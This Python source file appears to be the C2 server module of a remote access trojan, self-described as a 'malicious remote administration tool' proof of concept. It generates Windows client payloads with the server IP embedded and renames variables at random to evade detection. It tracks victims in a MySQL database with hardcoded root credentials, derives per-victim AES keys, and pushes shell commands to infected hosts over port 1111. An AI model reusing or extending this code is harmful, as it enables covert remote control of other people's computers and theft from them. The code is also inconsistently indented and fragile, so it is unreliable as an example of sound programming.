#!/usr/bin/env python
# encoding: utf-8

import socket
import threading
import MySQLdb
import base64
import string
import codecs
import subprocess
import time
import signal
import os
import random
import uuid
from time import gmtime, strftime
from Crypto import Random
from Crypto.Cipher import AES
from urllib import urlopen

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[:-ord(s[len(s)-1:])]

def randomize_client():
	f = open('bin/generic_client.py','r')
	content = f.read()
	content_text = str(content)
	f.close
	# a = int(001)
	for a in range(1, 46):
		ran = random.choice(string.ascii_letters) + uuid.uuid4().hex
		if int(a) < 012:
			var = str("var") + str("00") + str(a)
			content_text = str(content_text).replace(var,ran)
		else:
			var = str("var") + str("0") + str(a)
			content_text = str(content_text).replace(var,ran)
	f = open('bin/generic_client.py','w')
	f.write(str(content_text))
	f.close()
	print("[+] An unique source code have been build for a generic Windows client")
	print(" ")

def generate_client():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 1))
	Local_ip = s.getsockname()[0]
	s.close()
	file = open("bin/template_client.py","r")
	content = file.read()
	content_text = str(content).replace("IP_SERVER_ADRESS",Local_ip)
	f = open('bin/generic_client.py','w')
	f.write(content_text)
	f.close()
	randomize_client()

def banner():
	print("    ____        __  __                   ____  ___  ______")
	print("   / __ \__  __/ /_/ /_  ____  ____     / __ \/   |/_  __/")
	print("  / /_/ / / / / __/ __ \/ __ \/ __ \   / /_/ / /| | / /   ")
	print(" / ____/ /_/ / /_/ / / / /_/ / / / /  / _, _/ ___ |/ /    ")
	print("/_/    \__, /\__/_/ /_/\____/_/ /_/  /_/ |_/_/  |_/_/     ")
	print("      /____/                                              ")
	print("						by HomardBoy ")
	print("Proof of concept of a malicious remote administration tool")
	print("DO NOT USE on a system that you do not own. ")
	print("https://github.com/GuillaumeOrlando/Python_RAT")
	print(" ")
	print("[+] Looking for new clients ...")

def start_server():
	location = os.system("gnome-terminal -e 'python server.py'")

def kill_server():
	p = subprocess.Popen(['ps', '-ax'], stdout=subprocess.PIPE)
	out, err = p.communicate()
	for line in out.splitlines():
		if 'python server.py' in line:
			pid = int(line.split(None, 1)[0])
			os.kill(pid, signal.SIGKILL)
			print("[+] C2 server stopped !")
			print(" ")

def get_key_from_mac(mac):
	# Take the mac address of an host and retreive his AES key
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
	cursor.execute( """SELECT aes_key FROM clients.clients WHERE mac = %s""",([mac]))
        rows = cursor.fetchall()
        db.close()
	key = str(rows).replace("(('","").replace("',),)","")
	# print("aes key :" + str(key))
	return key

def decrypt(msg,key):
	# Decipher function
	msg = base64.b64decode(msg)
	iv = msg[:AES.block_size]
	cipher = AES.new(key, AES.MODE_OFB, iv)
	try:
		msg = unpad(cipher.decrypt(msg[AES.block_size:]))
		return msg
	except:
		print("[-] Corrupted message")

def check_aes_key():
	# Check if a client don't have is decryption key in the database. If not, generate it.
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        cursor.execute( """SELECT id FROM clients.clients WHERE aes_key = 'key'""")
        rows = cursor.fetchall()
        db.close()

	if str(rows) == "()":
		# print("[+] All the clients keys are up to date")
		pass
	else:
		chaine = str(rows)
		chaine1 = chaine.replace("(","").replace(")","").replace("L,","").replace(" ","")
		for id in chaine1.split(","):
			calc_aes_key(id)

def calc_aes_key(iden):
	# Get the AES key for a specific client (from uuid and mac adress) then add it into the database
	array = []
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
	cursor.execute( """SELECT uuid, mac FROM clients.clients WHERE id = %s""",([str(iden)]))
        rows = cursor.fetchall()
        db.close()

	if str(rows) == "()":
		#print("[-] Sorry, this client does not exist ... Check manually in the database if you have a doubt")
		pass
	else:
		pass

	for items in rows:
		element = str(items)

                for elem in element.split(','):
                        array.append(elem)

	uuid = str(array)[4:40]
	mac = str(array)[47:60]

	key_part1 = str(base64.b64encode(str(uuid).encode("utf-8")))
	key_part2 = ''
	key_part3 = ''
	for numbers in mac:
		key_part2 += str(string.ascii_lowercase[int(numbers)])
		key_part3 = codecs.encode(key_part2, 'rot-13')

	key = str(key_part1) + str(key_part3)

	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
	cursor.execute("""UPDATE clients.clients SET aes_key = %s WHERE id = %s""",([key],[str(iden)]))
        db.commit()
	db.close()

	#print("[+] AES key generate")


def check_alive():
	alive = []
	#Check if the hosts have been connected in the last minute
	#If not, marked them as 'down'
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        # Init connexion à la BDD

        cursor.execute( """SELECT uuid, last_alive FROM clients.clients WHERE status = 'Alive'""")
        rows = cursor.fetchall()
	db.close()

	check_aes_key()

	if str(rows) == "()":
		print("[WARNING] All the clients seems down !")
	else:
		pass

	count_alive = 0
	for items in rows:
		element = str(items)

		for elem in element.split(','):
			count_alive += 1
			alive.append(elem)

			if '-' in elem:
				uuid_not_parse = str(elem)
				uuid = uuid_not_parse[2:38]

			if 'Alive' in elem:
				# print(str(count_alive) + elem)
				remote_date = str(elem).replace("Alive","")[:-2][3:29]
				local_date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())

				# récupère date entière du client et du server
				local_date_prefixe = local_date[0:13]
				remote_date_prefixe = remote_date[0:13]

				# comparaison va être faite avec le préfixe date + heure
#				print("R : " + remote_date)
#				print("L : " + local_date)

				local_date_minute = local_date[14:16]
                                remote_date_minute = remote_date[14:16]

				local_date_secondes = local_date[17:19]
				remote_date_secondes = remote_date[17:19]

				local_date_compare = local_date_minute + ":" + local_date_secondes
				remote_date_compare = remote_date_minute + ":" + remote_date_secondes

				local = time.strptime(local_date_compare, "%M:%S")
				remote = time.strptime(remote_date_compare, "%M:%S")

				min = int(local_date_minute) - int(remote_date_minute)
				sec = int(local_date_secondes) - int(remote_date_secondes)

				db = MySQLdb.connect("localhost","root","toor","clients")
                                cursor = db.cursor()
                                # Init connexion à la BDD
				Hours_diff = True

				if str(local_date_prefixe) != str(remote_date_prefixe):
				# Si le client ne s'est pas connecté depuis plus d'1h ou plus
					Hours_diff = False
					db = MySQLdb.connect("localhost","root","toor","clients")
			        	cursor = db.cursor()
        				# Init connexion à la BDD

					cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Down',[uuid]))
		                        db.commit()
					print("[DEBUG] Client down : " + str(uuid))
					db.close()
					# Update le status du client à 'Down'

				if Hours_diff == True and min > 1:
					db = MySQLdb.connect("localhost","root","toor","clients")
                                        cursor = db.cursor()
                                        # Init connexion à la BDD

                                        cursor.execute("""UPDATE clients.clients SET status = %s WHERE uuid = %s""",('Down',[uuid]))
                                        db.commit()
                                        print("[+] Client seems down : " + str(uuid))
                                        db.close()
                                        # Update le status du client à 'Down'

					# Check for the AES keys

def send_cmd(remote_cmd,remote_client):
	# Need to take two args : The remote command and the remote host to interact with

#	print("[DEBUG] Sending command :" + str(remote_cmd))

	socket_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket_cmd.connect((str(remote_client), 1111))

	chaine = "shell " + str(remote_cmd)

	try:
		socket_cmd.send(chaine.encode())
		socket_cmd.close()
#		print("[DEBUG] Command send !")
	except:
		socket_cmd.close()
#		print("[DEBUG] Command not send, debug me !")

def who_is_alive():
	db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        # Init connexion à la BDD

        cursor.execute( """select id,lip,computer from clients.clients""")
        rows = cursor.fetchall()
        db.close()
	array1 = []
	count_array = 0
	count = 0

	for elems in str(rows).split(","):
		array1.append(elems)
	for elems in array1:
		count_array += 1
	nb_elems = count_array / 3
	print(" ")
	print("[+] There is " + str(nb_elems) + " clients : ")

	if nb_elems == 1:
		for result in rows:
                        for x in range (0,nb_elems):
                                chaine = str(result[1]) + " : " + str(result[2])
                                print("[" + str(result[0]) + "] " + chaine)
                print(" ")

	else:
		for result in rows:
			for x in range (0,nb_elems-1):
				a = x * 3
				b = a + 1
				c = b + 1
				d = x + 1
			chaine = str(result[b]) + " : " + str(result[c])
			print("[" + str(result[a]) + "] " + chaine)
		print(" ")

def who_is_alive_connected():
        db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
        # Init connexion à la BDD

        cursor.execute( """select id,lip,computer from clients.clients where status = 'Alive'""")
        rows = cursor.fetchall()
        db.close()
        array1 = []
        count_array = 0
        count = 0

        for elems in str(rows).split(","):
                array1.append(elems)
        for elems in array1:
                count_array += 1
        nb_elems = count_array / 3
        print(" ")
        print("[+] There is " + str(nb_elems) + " connected clients : ")

	if nb_elems == 0:
		print("[-] All clients seems down")
		print(" ")

	elif nb_elems == 1:
		for result in rows:
			for x in range (0,nb_elems):
				chaine = str(result[1]) + " : " + str(result[2])
                		print("[" + str(result[0]) + "] " + chaine)
		print(" ")
	else:
        	for result in rows:
	                for x in range (0,nb_elems-1):
        	                a = x * 3
        	                b = a + 1
        	                c = b + 1
        	                d = x + 1
        	        chaine = str(result[b]) + " : " + str(result[c])
        	        print("[" + str(result[a]) + "] " + chaine)
		print(" ")


#while True:
#	time.sleep(30)
#	check_alive()
